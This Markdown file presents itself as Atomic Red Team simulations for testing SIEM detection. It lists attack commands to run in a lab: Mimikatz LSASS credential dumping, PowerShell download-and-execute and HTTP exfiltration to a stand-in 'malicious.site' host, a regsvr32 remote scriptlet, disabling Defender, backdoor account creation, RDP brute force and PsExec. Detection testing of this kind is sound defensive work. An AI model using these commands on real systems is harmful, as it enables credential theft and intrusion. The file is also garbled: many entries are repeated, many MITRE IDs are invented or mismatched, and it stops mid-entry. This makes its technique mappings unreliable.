# 🔥 Atomic Red Team – 30 MITRE ATT&CK Technique Simulations

This file contains 30 real-world attack technique simulations to validate SIEM detection capabilities.

## ✅ T1003.001 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.001**

## ✅ T1059.001 – PowerShell Execution

### Description
Execute PowerShell commands to download and run a script remotely.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://malicious.site/script.ps1")
```

### Tool Used
PowerShell

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1059.001**

## ✅ T1071.001 – HTTP Communication

### Description
Use PowerShell to send HTTP POST data for exfiltration.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
Invoke-WebRequest -Uri "http://malicious.site/exfil" -Method POST -Body "Sensitive Data"
```

### Tool Used
PowerShell

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1071.001**

## ✅ T1086 – Command-Line Interface

### Description
Execute commands to enumerate user or create new accounts.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
cmd.exe /c whoami & net user attacker P@ssw0rd! /add
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1086**

## ✅ T1021.001 – Remote Desktop Protocol Brute Force

### Description
Simulate RDP brute force using Hydra.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
hydra -t 4 -V -f -l Administrator -P passwords.txt rdp://192.168.56.101
```

### Tool Used
Hydra

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1021.001**

## ✅ T1033 – System Owner/User Discovery

### Description
Identify the current user context.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
whoami
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1033**

## ✅ T1057 – Process Discovery

### Description
List running processes using tasklist.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
tasklist
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1057**

## ✅ T1016 – System Network Configuration Discovery

### Description
Query system network configuration.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
ipconfig /all
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1016**

## ✅ T1082 – System Information Discovery

### Description
Get detailed system information.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
systeminfo
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1082**

## ✅ T1049 – System Network Connections Discovery

### Description
Enumerate current network connections.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
netstat -ano
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1049**

## ✅ T1005 – Data from Local System

### Description
Copy local file contents to another location.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
copy C:\sensitive_data.txt D:\stolen_data.txt
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1005**

## ✅ T1218.005 – Regsvr32 Execution

### Description
Use regsvr32 to execute a remote script.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
regsvr32 /s /n /u /i:http://malicious.site/file.sct scrobj.dll
```

### Tool Used
Regsvr32

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1218.005**

## ✅ T1055.001 – Process Injection - DLL Injection

### Description
Inject DLL into running process.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
RunDll32.exe C:\evil.dll,EntryPoint
```

### Tool Used
RunDll32

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1055.001**

## ✅ T1562.001 – Disable Security Tools - Windows Defender

### Description
Disable Defender Real-Time Monitoring.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Tool Used
PowerShell

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1562.001**

## ✅ T1036.005 – Masquerading - Match Legitimate Name

### Description
Run a malicious file renamed to svchost.exe.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
renamed_malware.exe
```

### Tool Used
CMD

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1036.005**

## ✅ T1003.0016 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0016**

## ✅ T1003.0017 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0017**

## ✅ T1003.0018 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0018**

## ✅ T1003.0019 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0019**

## ✅ T1003.0020 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0020**

## ✅ T1003.0021 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0021**

## ✅ T1003.0022 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0022**

## ✅ T1003.0023 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0023**

## ✅ T1003.0024 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0024**

## ✅ T1003.0025 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0025**

## ✅ T1003.0026 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0026**

## ✅ T1003.0027 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0027**

## ✅ T1003.0028 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0028**

## ✅ T1003.0029 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0029**

## ✅ T1003.0030 – LSASS Credential Dumping

### Description
Access LSASS memory to dump credentials using Mimikatz.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
Mimikatz

### Expected Behavior
- Logs generated in Sysmon, Winlogbeat, or Windows Event Log
- Command-line execution, process creation, or network activity

### Detection
- SIEM rule triggered
- Alert mapped to MITRE ATT&CK: **T1003.0030**

## ✅ T1131 – Creation of scheduled tasks or services

### Description
Simulates creation of scheduled tasks or services to evaluate detection capability for MITRE tactic **Persistence**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
schtasks /create /tn "Updater" /tr "cmd.exe /c calc.exe" /sc minute /mo 1
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of creation of scheduled tasks or services on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1131**


## ✅ T1132 – Exploiting system utilities for higher privileges

### Description
Simulates exploiting system utilities for higher privileges to evaluate detection capability for MITRE tactic **Privilege Escalation**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
whoami /priv
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of exploiting system utilities for higher privileges on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1132**


## ✅ T1133 – Masking command execution with obfuscation

### Description
Simulates masking command execution with obfuscation to evaluate detection capability for MITRE tactic **Defense Evasion**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -EncodedCommand aQBlAHgA
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of masking command execution with obfuscation on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1133**


## ✅ T1134 – Harvesting login credentials from memory

### Description
Simulates harvesting login credentials from memory to evaluate detection capability for MITRE tactic **Credential Access**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of harvesting login credentials from memory on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1134**


## ✅ T1135 – System or network enumeration commands

### Description
Simulates system or network enumeration commands to evaluate detection capability for MITRE tactic **Discovery**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
net view && net user
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of system or network enumeration commands on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1135**


## ✅ T1136 – Remote service usage for movement

### Description
Simulates remote service usage for movement to evaluate detection capability for MITRE tactic **Lateral Movement**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
PsExec.exe \\target cmd.exe
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of remote service usage for movement on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1136**


## ✅ T1137 – Staging files for exfiltration

### Description
Simulates staging files for exfiltration to evaluate detection capability for MITRE tactic **Collection**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
copy C:\Users\Public\Documents\*.docx D:\Staged\\
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of staging files for exfiltration on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1137**


## ✅ T1138 – Beaconing to external command servers

### Description
Simulates beaconing to external command servers to evaluate detection capability for MITRE tactic **Command and Control**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.site/c2.ps1\')"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of beaconing to external command servers on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1138**


## ✅ T1139 – Copying data to removable media or network

### Description
Simulates copying data to removable media or network to evaluate detection capability for MITRE tactic **Exfiltration**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell -c "Get-Content C:\data.txt | Out-File \\10.10.10.10\share\data.txt"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of copying data to removable media or network on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1139**


## ✅ T1140 – Malicious script execution using renamed tools

### Description
Simulates malicious script execution using renamed tools to evaluate detection capability for MITRE tactic **Execution**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -Command "Start-Process notepad.exe"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of malicious script execution using renamed tools on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1140**


## ✅ T1141 – Creation of scheduled tasks or services

### Description
Simulates creation of scheduled tasks or services to evaluate detection capability for MITRE tactic **Persistence**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
schtasks /create /tn "Updater" /tr "cmd.exe /c calc.exe" /sc minute /mo 1
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of creation of scheduled tasks or services on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1141**


## ✅ T1142 – Exploiting system utilities for higher privileges

### Description
Simulates exploiting system utilities for higher privileges to evaluate detection capability for MITRE tactic **Privilege Escalation**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
whoami /priv
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of exploiting system utilities for higher privileges on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1142**


## ✅ T1143 – Masking command execution with obfuscation

### Description
Simulates masking command execution with obfuscation to evaluate detection capability for MITRE tactic **Defense Evasion**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -EncodedCommand aQBlAHgA
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of masking command execution with obfuscation on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1143**


## ✅ T1144 – Harvesting login credentials from memory

### Description
Simulates harvesting login credentials from memory to evaluate detection capability for MITRE tactic **Credential Access**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of harvesting login credentials from memory on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1144**


## ✅ T1145 – System or network enumeration commands

### Description
Simulates system or network enumeration commands to evaluate detection capability for MITRE tactic **Discovery**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
net view && net user
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of system or network enumeration commands on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1145**


## ✅ T1146 – Remote service usage for movement

### Description
Simulates remote service usage for movement to evaluate detection capability for MITRE tactic **Lateral Movement**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
PsExec.exe \\target cmd.exe
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of remote service usage for movement on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1146**


## ✅ T1147 – Staging files for exfiltration

### Description
Simulates staging files for exfiltration to evaluate detection capability for MITRE tactic **Collection**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
copy C:\Users\Public\Documents\*.docx D:\Staged\\
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of staging files for exfiltration on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1147**


## ✅ T1148 – Beaconing to external command servers

### Description
Simulates beaconing to external command servers to evaluate detection capability for MITRE tactic **Command and Control**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.site/c2.ps1\')"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of beaconing to external command servers on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1148**


## ✅ T1149 – Copying data to removable media or network

### Description
Simulates copying data to removable media or network to evaluate detection capability for MITRE tactic **Exfiltration**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell -c "Get-Content C:\data.txt | Out-File \\10.10.10.10\share\data.txt"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of copying data to removable media or network on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1149**


## ✅ T1150 – Malicious script execution using renamed tools

### Description
Simulates malicious script execution using renamed tools to evaluate detection capability for MITRE tactic **Execution**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -Command "Start-Process notepad.exe"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of malicious script execution using renamed tools on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1150**


## ✅ T1151 – Creation of scheduled tasks or services

### Description
Simulates creation of scheduled tasks or services to evaluate detection capability for MITRE tactic **Persistence**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
schtasks /create /tn "Updater" /tr "cmd.exe /c calc.exe" /sc minute /mo 1
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of creation of scheduled tasks or services on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1151**


## ✅ T1152 – Exploiting system utilities for higher privileges

### Description
Simulates exploiting system utilities for higher privileges to evaluate detection capability for MITRE tactic **Privilege Escalation**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
whoami /priv
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of exploiting system utilities for higher privileges on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1152**


## ✅ T1153 – Masking command execution with obfuscation

### Description
Simulates masking command execution with obfuscation to evaluate detection capability for MITRE tactic **Defense Evasion**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
powershell.exe -EncodedCommand aQBlAHgA
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of masking command execution with obfuscation on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1153**


## ✅ T1154 – Harvesting login credentials from memory

### Description
Simulates harvesting login credentials from memory to evaluate detection capability for MITRE tactic **Credential Access**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of harvesting login credentials from memory on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1154**


## ✅ T1155 – System or network enumeration commands

### Description
Simulates system or network enumeration commands to evaluate detection capability for MITRE tactic **Discovery**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
net view && net user
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of system or network enumeration commands on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1155**


## ✅ T1156 – Remote service usage for movement

### Description
Simulates remote service usage for movement to evaluate detection capability for MITRE tactic **Lateral Movement**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

### Atomic Test
```cmd
PsExec.exe \\target cmd.exe
```

### Tool Used
CMD

### Expected Behavior
- Activity is logged via Sysmon or Windows Event Log
- Indicates a potential instance of remote service usage for movement on the host

### Detection
- Alerts should be triggered by rules matching file creation or command-line patterns
- Mapped to MITRE ATT&CK: **T1156**


## ✅ T1157 – Staging files for exfiltration

### Description
Simulates staging files for exfiltration to evaluate detection capability for MITRE tactic **Collection**.

### ⚠️ Important Note
The following command is for **educational use only** and must be executed in an **isolated lab**. Do not use on production systems.

